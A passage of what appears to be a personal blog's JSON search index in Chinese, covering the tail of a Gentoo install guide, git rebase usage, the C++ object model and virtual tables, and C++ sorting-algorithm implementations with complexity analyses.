7 8 # 退出 chroot 环境 exit # 取消挂载 cd umount -l /mnt/gentoo/dev{/shm,/pts,} umount -R /mnt/gentoo # 重启，黑屏后拔出U盘 reboot 最后 如果系统成功启动，那么恭喜你完成了难度很高的 Gentoo 安装工作，但是对于使用 Gentoo 来说， 安装只是第一步，接下来就需要你自己完成剩余的装修工作了，难度丝毫不亚于安装的难度，但是你也会收获很多。 比如 Linux 内核配置优化流程、各种软件 USE 标记使用、循环依赖怎么解决、桌面环境选择等等。\n","description":"","tags":["Linux","日常","折腾"],"title":"Gentoo安装记录","uri":"/posts/id/09061821/"},{"categories":["posts"],"content":"最近在RSShub PR时遇到了rebase使用错误造成了commit混乱的情况，所以总结一下rebase的基本使用，避免再错误使用。\n起因是添加了新的功能，但是本地进行了多次修改提交，本来想合并多个提交，本来是很简单的几个步骤（学习之后），但是当时不太会用，随便找了一个教程用，结果把简单的commit整得。。。废话不多说了，开始正文。\nrebase rebase，又称变基，一般用于合并多个commit，删除某个提交，或者将某个分支上的提交变基（不同于merge，理解为转移或许更好?）到其他分支。推荐使用前先练习几次再使用，避免出现悲剧，练习可以使用 vscode + Git Graph插件进行练习，方便可视化查看分支以及提交情况。\n修改当前分支commit git rebase 可以修改当前分支上多个提交，方式是使用交互模式进行修改，比如合并、删除等操作：\n1 2 3 4 5 6 7 # 指定开始提交和结束提交，注意区间是前开后闭 # end_commit 可以不指定，默认一直到最新的提交(不推荐直接使用) # -i 指定交互模式 git rebase -i \u003cstart_commit\u003e [end_commit] # 也可以这样使用，HEAD表示当前指向，n表示当前HEAD往前n个提交 git rebase -i HEAD~n 比如合并当前HEAD和之前的两个请求，可以使用 git rebase -i 开始commit 结束ommit 或者 git rebase -i HEAD~2 。之后会打开默认的文本编辑器并有类似下面的代码，要求我们指定每个commit修改方式：\n# 注意这里的时间线跟 git log 的相反，上面的时间更靠前\rpick 49cfdc3 fix(main): xxx - 功能修改\rpick 3d53483 fix(main): 建议修改\r# Rebase 4694753..3d53483 onto 4694753 (2 commands)\r#\r# Commands:\r# p, pick \u003ccommit\u003e = use commit\r# r, reword \u003ccommit\u003e = use commit, but edit the commit message\r# e, edit \u003ccommit\u003e = use commit, but stop for amending\r# s, squash \u003ccommit\u003e = use commit, but meld into previous commit\r# f, fixup [-C | -c] \u003ccommit\u003e = like \"squash\" but keep only the previous\r# commit's log message, unless -C is used, in which case\r# keep only this commit's message; -c is same as -C but\r# opens the editor\r# x, exec \u003ccommand\u003e = run command (the rest of the line) using shell\r# b, break = stop here (continue rebase later with 'git rebase --continue')\r# d, drop \u003ccommit\u003e = remove commit\r# l, label \u003clabel\u003e = label current HEAD with a name\r# t, reset \u003clabel\u003e = reset HEAD to a label\r# m, merge [-C \u003ccommit\u003e | -c \u003ccommit\u003e] \u003clabel\u003e [# \u003coneline\u003e]\r# create a merge commit using the original merge commit's\r# message (or the oneline, if no original merge commit was\r# specified); use -c \u003ccommit\u003e to reword the commit message\r# u, update-ref \u003cref\u003e = track a placeholder for the \u003cref\u003e to be updated\r# to this position in the new commits. The \u003cref\u003e is\r# updated at the end of the rebase\r# 关于常用的几个模式的解释：\n模式 说明 p, pick 保留提交，并且保留commit注释 r, reword 保留提交，但是需要修改commit注释 e, edit 保留提交，并且需要修改提交（不仅是commit注释） s, squash 跟前一个提交进行合并 f, fixup 跟前一个提交进行合并，不会保留commit注释 d, drop 删除本次提交 更多细节请查看官方文档或者 man 。\n如果需要合并这两个提交并且之后重新指定commit注释，只需要修改为：\n1 2 pick 49cfdc3 fix(main): xxx - 功能修改 s 3d53483 fix(main): 建议修改 作用是将 建议修改 与 功能修改合并到一起，保存退出后会再打开一个窗口，在里面指定新的提交信息，如果没有问题修改完成后这两条提交就合并为一条新的提交了。\n如果将 s 换为 f ，则不需要指定新的提交注释，最后会保留 功能修改 的提交。\n变基到其他分支 rebase跟merge类似，两者都可以将两个不同分支修改合并到一起，但是merge会保留完整的提交信息，而rebase不会有合并信息，看起来就像是基于合并后的分支进行的开发。\nrebase行为类似打补丁，假设对于 main 分支和 dev 分支，dev 分支从main分支某个提交后分离出，并且进行了某些修改产生了多个提交，此时将dev合并到main分支与变基到main分支是不同的：\nmerge：\n1 2 3 4 5 # 切换到 main 分支 git checkout main # 合并dev分支到当前分支 git merge dev rebase:\n1 2 3 4 5 # 切换到dev分支 git checkout dev # 变基到main分支 git rebase main 不过通常 rebase 跟 merge 是配合使用的。\n可以看到使用rebase合并几个提交信息是很简单的，吸取教训，之后碰到新的知识，先实验一下再使用！！！\n","description":"","tags":["Code","Git","笔记"],"title":"Git rebase使用","uri":"/posts/id/6131519/"},{"categories":["posts"],"content":"C++对象模型 了解 C++对象模型对于理解 C++中用于实现多态的虚函数很有帮助，这篇文章主要参考了《深入理解 C++对象模型》一书中的内容。\n在 C 语言中，数据结构和处理数据的操作通常是分开的，使用结构体定义复合类型，然后使用函数进行操作，考虑一个 3 维坐标的点，和打印这个点的操作：\n1 2 3 4 5 6 7 8 9 10 11 12 // 数据定义 struct Vec3 { double x; double y; double z; }; // 打印点的操作 void PrintVec3(const struct Vec3* vec) { printf(\"(%lf, %lf, %lf)\", vec-\u003ex, vec-\u003ey, vec-\u003ez); } 而在 C++中，更多时候会定义一个类，这个类包含了数据定义和一些操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // 类 class Vec3 { public: explicit Vec3(double x, double y, double z); ~Vec3(); void print() const; public: static double TMP; private: double _x; double _y; double _z; }; // 静态成员变量不能类内初始化 double Vec3::TMP = 0.0; // ... 操作实现 int main() { Vec3 vec{}; // 打印 vec对象占用内存(字节) std::cout \u003c\u003c sizeof(vec) \u003c\u003c std::endl; } 像这种简单的类封装几乎没有性能损失，成员函数、类静态成员都不占用类对象空间，如果打印 Vec3 类对象占用空间大小就会发现只有 24 字节（ double 类型占用 8 字节）。C++类对象性能和内存损失主要表现在 继承 和 虚函数 ！\n最初设计的对象模型主要有 3 种：\n简单对象模型 ： 这种对象模型确实很简单，示意图如下：\n对象每个函数和成员变量都对应类对象中的一个槽，槽可以使用指针来指向数据、函数，这样类对象大小就很明确了：类对象成员个数 x 语言中每个指针类型大小 。\n这种模式很简单，也很局限，如果只是简单的继承和多态可以应对，如果遇上多重继承就不能应对了。\n表格驱动对象模型 ： 表格驱动的模型把成员信息抽离出来组合成不同的表格，类对象中只存储指向这个表格的指针，进一步缩小了类对象大小，不过由于使用时需要不断解引用地址，相应的运行效率就降低了，示意图如下：\n这种对象模型实际用到的不多，不过为 C++虚函数提供了可行方案。\nC++采用的对象模型 ： C++对象模型对简单对象模型进行了优化，并引入了表格驱动式对象模型类似模型，在这个模型中，非静态数据成员被直接放入对象中，静态数据成员和所有成员函数独立于对象之外，对于类中含有一个或多个虚函数的情况：\n会产生一堆指向虚函数的指针，并组合到一个虚函数表中。 同时每个对象都会添加一个我们看不见的 额外指针 ，指向相应的虚函数表，这个指针通常被称为 vptr ，vptr 的初始化和结束工作由编译器完成。 另外虚函数表头部包含一个指向 type_info 的指针，RTTI 运行时类型识别由编译器在编译时生成的特殊类型信息，包括了对象继承关系，对象本身描述等信息，该类型是为多态生成的，所以只有包含虚函数的类才会生成。 有继承时的对象模型 C++继承有多种权限( public 、private 、protected 等) ，不过对象模型不会因为继承权限而改变！\n单继承 对于子类无重写的单继承（子类没有重写父类虚函数）： 基类模型不受影响，由于不是虚继承，所以只是扩充现有虚函数表 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 基类 class Base { public: Base(int); virtual ~Base(); virtual void show(); private: int _num; } class Derive : public Base { public: Derive(int); virtual ~Derive(); virtual void derived_show(); private: int _derived_num; } 对象模型：\n对于重写父类虚函数的单继承： 在扩充现有虚函数表基础上，虚函数表中用子类虚函数覆盖重写的父类虚函数 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // 基类 class Base { public: Base(int); virtual ~Base(); virtual void show(); private: int _num; } class Derive : public Base { public: Derive(int); virtual ~Derive(); void show() override; virtual void derived_show(); private: int _derived_num; } 对象模型：\n多继承 单继承时，派生类只是扩充了基类对象数据成员和虚函数表，不过多继承时，使用的方案有所不同：\n每个基类都对应有一个虚函数表。 子类虚函数被放入第一个基类虚函数表中。 内存布局上，按照声明顺序布局（ class C : public A, public B =\u003e 先 A，再 B ）。 如果子类有重写父类虚函数，会替换相应父类虚函数表中函数，如果多个父类有相同虚函数形式，会替换多个父类中虚函数表中重写部分函数（为了当不同基类类型的指针指向同一个子类实例时可以正确调用到重写的函数）。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // 基类 class Base { public: Base(int); virtual ~Base(); virtual void show(); private: int _num; } // 基类1 class Base1 { public: Base1(int); virtual ~Base1(); virtual void show(); private: int _num1; } class Derive : public Base, public Base1 { public: Derive(int); virtual ~Derive(); void show() override; virtual void derived_show(); private: int _derived_num; } 对象模型：\n虚继承 虚继承是为了解决多重继承中有相同父类的情况，在这种情况下，如果还是采用原先的对象模型，就会出现重复继承的基类拥有多个虚函数表。\n虚继承的子类拥有单独的虚函数表，另外也会单独保存一份父类的虚函数表，同时派生类和不同基类信息用 0x00000000 分隔开。先存放派生类虚函数指针和数据，再存放基类数据，如果有重写基类虚函数，替换基类虚函数表中相应函数。\n简单虚继承 ： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // 基类 class Base { public: Base(int); virtual ~Base(); virtual void show(); private: int _num; } class Derive : virtual Base { public: Derive(int); virtual ~Derive(); void show() override; virtual void derived_show(); private: int _derived_num; } 对象模型：\n复杂虚继承（菱形继承）： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 // 基类 class Base { public: Base(int); virtual ~Base(); virtual void show(); private: int _num; } // 类A class A : virtual Base { public: A(int); virtual ~A(); virtual void a_show(); void show() override; private: int _a; } // 类B class B : virtual Base { public: B(int); virtual ~B(); void show() override; virtual void b_show(); private: int _b; } class Derive : public A, public B { public: Derive(int); virtual ~Derive(); void show() override; void a_show() override; virtual void derived_show(); private: int _derived_num; } 对象模型：\n此时虚基类信息是独立的，保证了相同基类只有一个虚函数表，多继承布局跟之前一致，按声明顺序布局，派生类虚函数添加到第一个父类虚函数表后，派生类复写的函数会相应修改虚函数表中条目。\n多态 C++类多态主要通过虚函数实现，虚函数允许派生类重写，在虚函数表中，派生类复写的函数会覆盖基类函数，不过这种多态需要通过 指针或者引用 调用方法才行。\n默认情况下，C++可以隐式转换派生类指针到基类指针，但不能由基类指针自动转换为派生类指针。 一般情况下派生类对象都比基类对象大，由于解引用指针都需要指定类型（编译器可能通过指针寻址，然后根据类型读取指定大小数据），不能确定大于基类指针部分内存是否有效。如果你清楚的知道当前基类指针实际指向的内存为派生类对象，则可以使用 dynamic_cast\u003c\u003e 来强制转换基类指针为派生类指针。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Base; class Derive; ... int main() { // 默认允许的隐式类型转换 Base* pb = new Derive(); // 如果 Derive 对象复写了 Base 类虚函数 show // 可以准确调用到 Derive 对象的 show 函数，而不是 Base 类函数 pb-\u003eshow(); // 不允许！ // Derive* pd = new Base(); // 强制转换 Derive* pb = synamic_cast\u003cDerive*\u003e(pb); return 0; } 由于虚函数特殊性质，如果类被用作基类，将析构函数设置为虚函数是非常有必要的！ 这样可以确保在析构派生类对象时，可以按照正确顺序析构。\n如果析构函数不声明为虚函数，则派生类不会重写基类析构函数，当使用基类类型指针指向派生类对象时，指针释放时派生类指针析构函数不会被调用，很可能发生内存泄漏！！！\n1 2 3 4 5 6 7 void test_derive() { Base* pb = new Derive(); pb-\u003eshow(); // 由于基类析构函数没有重写，只调用了基类析构函数！ delete pb; } 静态多态 除了利用虚函数实现动态多态，还能使用 奇异模板递归模式 实现静态多态（我也不知道为什么要叫这么奇怪的名字），实现原理就是将派生类类型作为基类模板参数，在基类需要使用派生类的函数中使用 static_cast\u003cT\u003e(this) 完成类型转换，再调用对应函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u003ciostream\u003e template\u003cT\u003e struct Base { void a() { static_cast\u003cT*\u003e(this)-\u003ea(); } }; struct Derived : public Base\u003cDerived\u003e { void a() { std::cout \u003c\u003c \"Derived a\\n\"; } }; int main() { Derived d; d.a();\t// 输出 b 中内容 return 0; } 上面代码中 Derived 继承自 Base，并将 Base 模板设置成自身类型，通过 static_cast\u003cT*\u003e(this)完成类型转换，实现了纯虚函数类似效果，同时避免了虚函数实现的额外开销，不过这种实现方式并不能像传统动态多态一样动态绑定，具有一定的局限性。\n其中标准库中的 enable_shared_from 类就是采用的这种方法实现，感兴趣可以看看源码。\n","description":"深入理解C++对象模型，弄懂虚函数工作原理","tags":["Code","C++基础"],"title":"探索C++对象模型","uri":"/posts/id/6101908/"},{"categories":["posts"],"content":" 阅读须知：为简化实现，本文 C++代码排序用数据为 int 类型，且排序规模不大。\n选择排序 算法思路 ：[0, n) 区间内元素查找最小的元素并与最开始元素进行交换，再遍历 [1, n) 内元素最小值，与 1 处元素交换，依次缩小区间，直到全部元素有序。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void SelectSort(std::vector\u003cint\u003e\u0026 vec) { #if __DEBUG__ std::cout \u003c\u003c \"SelectSort Before: \"; PrintArray(vec); #endif auto len = vec.size(); for (int i = 0; i \u003c len; ++i) { int min = i; for (int j = i + 1; j \u003c len; ++j) { if (vec[j] \u003c vec[min]) { min = j; } } std::swap(vec[i], vec[min]); #if __DEBUG__ std::cout \u003c\u003c \"SelectSort: \"; PrintArray(vec); #endif } } 时间复杂度分析 ：\ni = 0 时，内层循环 j 循环 n - 1 次 i = 1 时，内层循环 j 循环 n - 2 次 i = 2 时，内层循环 j 循环 n - 3 次 . . . i = n -2 时，内层循环 1 次 循环次数为 $1 + ... + (n - 1) = \\frac{(n-1)(n-1+1)}{2} = \\frac{n(n-1)}{2}$ 故时间复杂度为 O(n^2) 。\n空间复杂度分析 ：只使用了 i 、j、len 作为临时变量，故为 O(1)。\n冒泡排序 算法思路 ：[0, n) 内元素进行相邻比较交换，将较大元素放到较小元素后面，一次遍历后最大的元素到了最后，之后再继续 [0, n-1) 区间内元素，直到区间排序完成，大的元素向后冒，故称冒泡排序。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 void MubbleSort(std::vector\u003cint\u003e\u0026 vec) { #if __DEBUG__ std::cout \u003c\u003c \"MubbleSort Before: \"; PrintArray(vec); #endif auto len = vec.size(); // 添加标志进行优化 bool flag = false; for (signed long i = len - 1; i \u003e -1; --i) { flag = true; for (size_t j = 0; j \u003c i; ++j) { if (vec[j] \u003e vec[j + 1]) { std::swap(vec[j], vec[j + 1]); // 发生了交换 flag = false; } } #if __DEBUG__ std::cout \u003c\u003c \"BubbleSort: \"; PrintArray(vec); #endif if (flag) { break; } } } 时间复杂度分析 ：\ni = n - 1 时，内层 j 循环 n - 1 次 ... i = 1 时，内层循环 1 次 一共循环 $\\frac{n*(n-1)}{2}$ 次 故时间复杂度为 O(n^2) ，使用标志位优化，再序列已经有序后退出外层循环，可减少循环次数。\n空间复杂度分析 ：只使用了循环计数和标志位，为 O(1) 。\n插入排序 算法思路 ：[0, n) 序列内元素，从 1 开始，依次向前查找已排序好的集合，找到当前元素合适的位置插入，比较过程中便同时进行了元素的后移操作（取出待排序元素后出现空位），类似打扑克牌时排好手中的牌。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 void InsertSort(std::vector\u003cint\u003e\u0026 vec) { #if __DEBUG__ std::cout \u003c\u003c \"InsertSort Before: \"; PrintArray(vec); #endif int len = vec.size(); for (int i = 1; i \u003c len; ++i) { int v = vec[i]; int j = i - 1; // 循环向前比较 while (j \u003e= 0) { if (vec[j] \u003e v) { vec[j + 1] = vec[j]; --j; } else { break; } } vec[j + 1] = v; #if __DEBUG__ std::cout \u003c\u003c \"InsertSort: \"; PrintArray(vec); #endif } } 时间复杂度分析 ：\n最好情况下序列已经有序，外层循环遍历一次，时间复杂度 O(n) 最坏情况下序列有序，但是时方向有序，内层循环每次需要执行 i 次，时间复杂度 $\\frac{n*(n+1)}{2}$ = O(n^2) 空间复杂度分析 ：只有循环变量和临时变量，为 O(1)\n归并排序 算法思路 ：对于两个已经有序的序列，可以通过指针遍历得到一个大的有序序列，而归并排序就是递归的将数组划分为不同的序列，直到最小序列，最后将子序列进行合并得到大的完整序列，即 递归+合并操作 ，故称 归并排序。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 // 递归实现，也可使用栈代替递归 void MergeSort(std::vector\u003cint\u003e\u0026 vec, size_t start, size_t end) { // 合并 [start,mid] 与 (mid, end] 两个区间序列 auto Merge = [](std::vector\u003cint\u003e\u0026 vec, size_t start, size_t mid, size_t end) { std::vector\u003cint\u003e tmp; tmp.reserve(end - start + 1); size_t l = start; size_t r = mid + 1; while (l \u003c= mid \u0026\u0026 r \u003c= end) { if (vec[l] \u003c= vec[r]) { tmp.push_back(vec[l]); l += 1; } else { tmp.push_back(vec[r]); r += 1; } } // 合并剩余序列 if (l \u003c= mid) { tmp.insert(tmp.end(), vec.begin() + l, vec.begin() + mid + 1); } else { tmp.insert(tmp.end(), vec.begin() + r, vec.begin() + end + 1); } #if __DEBUG__ std::cout \u003c\u003c \"Merge ({:\u003e2}, {:\u003e2}, {:\u003e2}): \"_fmt(start, mid, end); PrintArray(tmp); #endif // 写入到原序列 for (int i = start; i \u003c= end; ++i) { vec[i] = tmp[i - start]; } }; if (start \u003e= end) { return; } size_t mid = (start + end) / 2; // 递归左边 MergeSort(vec, start, mid); // 递归右边序列 MergeSort(vec, mid + 1, end); // 合并序列 Merge(vec, start, mid, end); } inline void MergeSort(std::vector\u003cint\u003e\u0026 vec) { #if __DEBUG__ std::cout \u003c\u003c \"MergeSort Before: \"; PrintArray(vec); #endif if (vec.size() \u003e 1) { MergeSort(vec, 0, vec.size() - 1); } #if __DEBUG__ std::cout \u003c\u003c \"MergeSort After: \"; PrintArray(vec); #endif } 时间复杂度分析 ：\n对于归并操作，可以在 n = n1 + n2 时间内完成两个有序序列合并 整个算法在于这个归并操作进行了多少次，使用递归的对半平分操作，即 $2^x = N$ ，则 $x = log^{N}_{2}$ 故整个算法时间复杂度为 O(n*logn) 。\n空间复杂度分析 ： 归并操作需要使用额外的辅组序列，且序列长度为 n = (n1 + n2) ，故空间复杂度为 O(n) 。\n算法优化 ：时间复杂度已经是基于比较的排序算法中最优了，但是可以优化空间复杂度，比如使用固定的序列并通过参数传递，避免频繁的内存分配与释放。\n桶排序 算法思路 ：对于 [0, n) 序列，创建若干个有序的桶 t1, t2, ... tn ，其中 桶 t(n+1) 中元素比 桶 t(n) 中元素大，再分别对每个桶中元素进行选择排序或者其他排序，使其有序，最后依次取出 t1 ... tn 中元素即排序完成。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // oneBucketCount : 每个桶最大元素数量 void BucketSort(std::vector\u003cint\u003e\u0026 vec, size_t oneBucketCount) { #if __DEBUG__ std::cout \u003c\u003c \"BucketSort Before: \"; PrintArray(vec); #endif // 获取最大最小值，方便划分桶范围 int minVal = arrayMinOrMax(vec, true); int maxVal = arrayMinOrMax(vec, false); // 桶数量 int bucketCount = (vec.size() / oneBucketCount) + 1; // 对于 [minVal, maxVal] 内元素，每个桶间元素间隔 int perBucket = (maxVal - minVal + bucketCount) / bucketCount; std::vector\u003cstd::vector\u003cint\u003e\u003e buckets(bucketCount); // 遍历序列，放入对应桶中 for (int val : vec) { buckets[(val - minVal) / perBucket].push_back(val); } // 遍历每个桶，进行桶内排序(选择排序或其他排序)，再写入原序列中 size_t index = 0; for (auto\u0026 bucket : buckets) { SelectSort(bucket); #if __DEBUG__ std::cout \u003c\u003c \"Bucket: \"; PrintArray(bucket); #endif for (int v : bucket) { vec[index++] = v; } } #if __DEBUG__ std::cout \u003c\u003c \"BucketSort After: \"; PrintArray(vec); #endif } 时间复杂度分析 ：\n最坏情况下就是所有元素都被分配到了一个桶里面，这时如果桶内采用选择、冒泡等排序算法时间复杂度会退化为 O(n^2) ，所以桶内可以采用归并排序，这样最坏情况时间复杂度也有 O(n*logn) 。 空间复杂度分析 ：需要把所有元素都放入桶内，所以空间复杂度为 O(n) 。\n桶排序对数据要求较高，适用于特定范围内分布较均匀的类型排序，所以一般用得较少。\n计数排序 算法思路 ：对于 [0, n) 范围内序列 Nums，找出最大元素 maxVal，最小元素为 0 ，创建一个 长度为 maxVal + 1 的数组 Count，遍历原序列，将 Count 中对应位置元素 + 1，即统计对应数字出现的次数。最后再遍历 Count 数组，根据出现的次数再依次写入原序列，即完成排序。因为是统计数字出现次数，故称 计数排序。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // 只考虑了正整数的情况 void CountingSort(std::vector\u003cint\u003e\u0026 vec) { #if __DEBUG__ std::cout \u003c\u003c \"CountingSort Before: \"; PrintArray(vec); #endif int maxLen = arrayMinOrMax(vec, false) + 1; // 找出最大元素并构建计数表（可使用哈希表代替） std::vector\u003cint\u003e table(maxLen, 0); // 遍历序列计数 for (int v : vec) { table[v] += 1; } // 根据计数重新赋值原序列 size_t idx = 0; for (int i = 0; i \u003c maxLen; ++i) { while (table[i] \u003e 0) { vec[idx++] = i; table[i] -= 1; } } #if __DEBUG__ std::cout \u003c\u003c \"CountingSort After: \"; PrintArray(vec); #endif } 时间复杂度分析 ：\n计数排序将数字计数放入哈希表，插入和查询都是 O(1) ，将所有数字插入再取出，总时间复杂度为 O(n) 。 空间复杂度分析 ：若序列中都为整数且为 [a, b] ，则空间复杂度为 O(b - a + 1) = O(m) 。\n虽然计数排序时间复杂度非常好，但是对数据要求太高，如果数字太大则无法很好的完成，如果有负数需要进行偏移处理，如果为非整数需要考虑精度等问题。不过在特定数据类型排序时还是可以常用的，不仅时间复杂度很低而且算法简单。\n基数排序 算法思路 ：借鉴了桶排序思路，不过不用再进行桶内排序。基数排序首先分配 10 个桶，对应数字 0 - 9 ，对于序列 [0, n) 内元素，遍历取个位，分别放入个位数对应的桶中，依次将桶内元素取出，再重复上面步骤，不过此时取的是十位，以此类推，直到全部数位取完，完成排序。（如果一个数所有位数都比另一个数大，自然就比它大了，当然负数、小数等除外）。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // 只考虑了正整数情况 void RadixSort(std::vector\u003cint\u003e\u0026 vec) { #if __DEBUG__ std::cout \u003c\u003c \"RadixSort Before: \"; PrintArray(vec); #endif // 底数，用去取特定数位值 long base = 1; // 取最大值，用于判断是否应该终止算法 int maxVal = arrayMinOrMax(vec, false); while (base \u003c maxVal) { // 创建十个桶 std::vector\u003cstd::vector\u003cint\u003e\u003e buckets(10); for (int val : vec) { // 插入到对应位的桶 buckets[(val / base) % 10].push_back(val); } size_t idx = 0; for (auto\u0026 bucket : buckets) { for (int v : bucket) { vec[idx++] = v; } } #if __DEBUG__ std::cout \u003c\u003c \"RadixSort: \"; PrintArray(vec); #endif base *= 10; } #if __DEBUG__ std::cout \u003c\u003c \"RadixSort After: \"; PrintArray(vec); #endif } 时间复杂度分析 ：\n也与数字的数据范围有关，如果其中最大数字位数为 m ，则外层取进位需要循环 m 次，内层循环 n 次，总时间复杂度为 O(m*n) 。 空间复杂度分析 ：总共需要十个桶，每个桶元素数量加起来为 n ，故为 O(n) 。\n基数排序是对计数排序的优化，可以更好的处理更大的数字，不过仍然对数据类型要求较高。\n快速排序 算法思路 ：首先选择一个基准数（一般为序列第一个数），然后遍历一次序列将比基准数小的的元素放到左边，比基准数大或等于的放到右边，将基准数与最后一次出现的小于基准数与基准数交换，这样一次遍历后基准数左边的比基准数小，右边的比基准数大或相等。然后分别处理基准数左边的序列和右边序列，最终完成排序。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 // 递归实现，可用栈迭代代替 void QuickSort(std::vector\u003cint\u003e\u0026 vec, size_t start, size_t end) { // 遍历给定范围序列，并区分基准值左边和右边 auto quickBase = [](std::vector\u003cint\u003e\u0026 vec, size_t start, size_t end) { // 随机快速排序优化 // size_t rdm_idx = random(start, end); // std::swap(vec[start], vec[rdm_idx]); size_t base = start; // 基准值 size_t j = start + 1; // 记录最后的比base小的元素位置 for (size_t i = start + 1; i \u003c= end; ++i) { if (vec[i] \u003c= vec[base]) { // 遇到更小的，交换到前面 std::swap(vec[j], vec[i]); // 此时j处元素比base处小了，向后移动一个，方便下次交换 j += 1; } } // 遍历完成，将基准值与最后出现的比基准值小的元素交换 // j - 1是因为我们进行了 j += 1操作 std::swap(vec[base], vec[j - 1]); base = j - 1; #if __DEBUG__ std::cout \u003c\u003c \"QuickSort priv: {} : \"_fmt(base); PrintArray(vec); #endif return base; }; if (start \u003e= end) { return; } // 遍历后基准值位置 size_t base = quickBase(vec, start, end); // 处理前半部分 QuickSort(vec, start, base - 1); // 处理后半部分 QuickSort(vec, base + 1, end); } inline void QuickSort(std::vector\u003cint\u003e\u0026 vec) { #if __DEBUG__ std::cout \u003c\u003c \"QucikSort Before: \"; PrintArray(vec); #endif if (vec.size() \u003e 1) { QuickSort(vec, 0, vec.size() - 1); } #if __DEBUG__ std::cout \u003c\u003c \"QucikSort After: \"; PrintArray(vec); #endif } 时间复杂度分析 ：\n最坏情况下是序列已经有序，此时每次遍历都不会实际交换元素，时间复杂度退化为 O(n^2) 最优情况，区间划分很均匀，递归树深度为 logn ，时间复杂度为 O(n*logn) 空间复杂度分析 ：主要消耗为递归栈内存消耗，最好情况递归深度为 logn ，空间复杂度为 O(logn) ，最坏情况需要进行 n - 1 次递归，空间复杂度 O(n)。\n快速排序面对特定范围数值排序时可能没有桶排序、计数排序、基数排序块，但是好在它的适用面广，适合多种场景。\n优化方案 ：\n普通快速排序缺点在于最坏情况时间复杂度为 O(n^2) ，可以通过 随机快速排序 进行优化，优化方法很简单，就是在选择基准数时使用随机数代替，获取到随机下标后与第一个元素交换，后面就跟普通快速排序一样了。虽然改动很小，但是却可以优化掉最坏情况下时间复杂度。\n希尔排序 算法思想 ：希尔排序是对 插入排序 的优化，对于 [0, n) 序列内元素， 首先间隔 gap 将序列划分为 gap 组，每组内分别进行插入排序，再将 gap / x ，. . . ，gap 为 1 ，所有元素变为 1 组，. . . ，直到 gap 为 0 ，排序完成。插入排序在基本有序的情况下排序很快，希尔排序利用增量，前期比较个数少，最后一趟元素基本有序，所以很快。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 void ShellSort(std::vector\u003cint\u003e\u0026 vec) { #if __DEBUG__ std::cout \u003c\u003c \"ShellSort Before: \"; PrintArray(vec); #endif // 计算增量，这里使用 gaps/3 计算 size_t len = vec.size(); long gaps = (len / 3) * 2; // 依次处理增量，增量为1为最后一趟 while (gaps \u003e 0) { // 对于每个增量，分别进行插入排序 for (long i = gaps; i \u003c len; ++i) { int val = vec[i]; long j = i; while (j \u003e= gaps) { if (vec[j - gaps] \u003e val) { vec[j] = vec[j - gaps]; } else { break; } j -= gaps; } vec[j] = val; } #if __DEBUG__ std::cout \u003c\u003c \"ShellSort gaps({}): \"_fmt(gaps); PrintArray(vec); #endif gaps /= 3; } #if __DEBUG__ std::cout \u003c\u003c \"ShellSort After: \"; PrintArray(vec); #endif } 时间复杂度分析 ：希尔排序时间复杂度跟增量的选择密切相关，比如 Sedgewick 提出的增量序列最坏情况有 O(4/3*n) 时间复杂度，平均 O(7/6*n) 时间复杂度，而 Hibbard 的增量序列最坏有 O(3/2*n) ，代码实现中为了简便使用的 1/3 递减增量，在数据量较小时具有较好的时间复杂度，具体使用什么增量序列可根据实际情况来定。\n空间复杂度分析 ：希尔排序跟插入排序一样使用原地交换，复杂度为 O(1) 。\n堆排序 算法思路 ：堆排序利用了小（大）顶堆的堆顶元素具有最小（大）的特性进行排序，首先将 [0, n) 序列构造成一个堆，然后将堆顶元素（也就是数组最开始元素）与数组最后元素交换，同时维护好 [0, n- 1) 序列成为新堆（堆顶元素下沉操作），依次交换首尾元素完成排序。\n堆是一种特殊的完全二叉树，大顶堆的父节点元素不小于子节点元素，而完全二叉树具有的一个很好的性质是：如果父节点下标为 n (从 0 开始的话), 则左右子节点下标分别为 ((n + 1) _ 2 - 1) 与 ((n+1) _ 2)，如果子节点下标为 n ，则父节点下标为 (n - 1) / 2 ，利用这个性质可以很方便使用数组完成堆的构建。\nC++代码实现 ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 void HeapSort(std::vector\u003cint\u003e\u0026 vec) { #if 